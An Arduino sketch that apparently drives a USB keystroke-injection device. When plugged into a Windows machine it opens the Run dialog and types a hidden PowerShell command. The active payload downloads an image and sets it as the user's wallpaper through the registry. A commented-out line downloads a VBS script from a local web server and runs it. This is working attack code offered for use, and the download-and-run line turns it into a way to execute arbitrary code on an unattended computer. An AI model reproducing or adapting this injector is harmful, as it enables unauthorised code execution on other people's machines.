#include <Keyboard.h>
#include "AzertyKeyboard.h"

String payload()
{
  String payload;
  // launch powershell in the background
  payload += "powershell.exe -windowstyle hidden Invoke-Command -ScriptBlock {";
  
  // exemple to download a vbs script from a web-server
  // payload = "$client = new-object System.Net.WebClient;$client.DownloadFile(\"http://192.168.0.120:8080/test.txt\",\"Sys32Data.vbs\");Start .\\Sys32Data.vbs;exit";

  // exemple to change the current wallpaper  
  payload += "cd C:/Users/Public;"; 
  payload += "iwr https://i.redd.it/c2aoeavyslo61.jpg -o img.jpg;";
  payload += "reg add \'HKEY_CURRENT_USER\\Control Panel\\Desktop\' /v Wallpaper /t REG_SZ /d C:/Users/public/img.jpg /f;";
  // spam this command to force the update of the wallpaper
  // if not used, the changes will take place at reboot
  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
  payload += "exit";

  payload += "}";

  return payload;
}

void setup()
{

  Keyboard.begin();

  //delay for debugging and safety
  delay(1000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  
  KeyboardPrint("cmd"); //cmd launch faster than powershell
  delay(300);
  pressKey(KEY_RETURN);

  delay(500);  
  
  KeyboardPrint(payload());
  
  delay(300);
  pressKey(KEY_RETURN);

  delay(500);

  Keyboard.end();
}

// be careful if using the loop
void loop() {}
